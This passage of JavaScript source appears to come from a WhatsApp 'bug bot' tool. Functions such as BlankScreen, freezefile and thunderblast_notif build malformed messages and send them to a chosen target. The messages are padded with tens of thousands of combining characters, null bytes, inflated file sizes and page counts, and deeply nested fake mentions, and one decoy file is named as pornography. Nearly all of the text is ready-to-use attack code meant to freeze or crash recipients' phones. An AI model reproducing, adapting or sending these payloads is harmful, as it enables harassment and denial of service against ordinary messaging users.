⃪⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            mentionedJid: Array.from({ length: 9 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            groupMentions: [
                                {
                                    groupJid: "1@newsletter", 
                                    groupSubject: "UNDEFINED",  
                                    groupMetadata: {
                                        creationTimestamp: 1715880173,  
                                        ownerJid: "owner@newsletter",  
                                        adminJids: ["admin@newsletter", "developer@newsletter"], 
                                    }
                                }
                            ],
                            externalContextInfo: {
                                customTag: "SECURE_PAYBUG_MESSAGE",  
                                securityLevel: "HIGH",  
                                referenceCode: "PAYBUG10291",  
                                timestamp: new Date().toISOString(),  
                                messageId: "MSG00123456789",  
                                userId: "UNDEFINED"  
                            },
                            mentionedJid: Array.from({ length: 9 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "9@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 8 }, () => "8@newsletter"),
                            groupMentions: [{ groupJid: "8@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 7 }, () => "7@newsletter"),
                            groupMentions: [{ groupJid: "7@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 6 }, () => "6@newsletter"),
                            groupMentions: [{ groupJid: "6@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 4 }, () => "4@newsletter"),
                            groupMentions: [{ groupJid: "4@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3 }, () => "3@newsletter"),
                            groupMentions: [{ groupJid: "3@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2 }, () => "2@newsletter"),
                            groupMentions: [{ groupJid: "2@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    ziole.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}
 async function BlankScreen(target, Ptcp = false) {
let virtex = "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
			await ziole.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://img1.pixhost.to/images/6002/603809921_imgtmp.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://img1.pixhost.to/images/6002/603809921_imgtmp.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻'))
   	};
async function freezefile(target, VcardQuoted, Ptcp = true) {
    let virtex = "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "ြ".repeat(25000);
    await ziole.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function thunderblast_notif(target) {
			await ziole.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://img1.pixhost.to/images/6002/603809921_imgtmp.jpg',
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷݉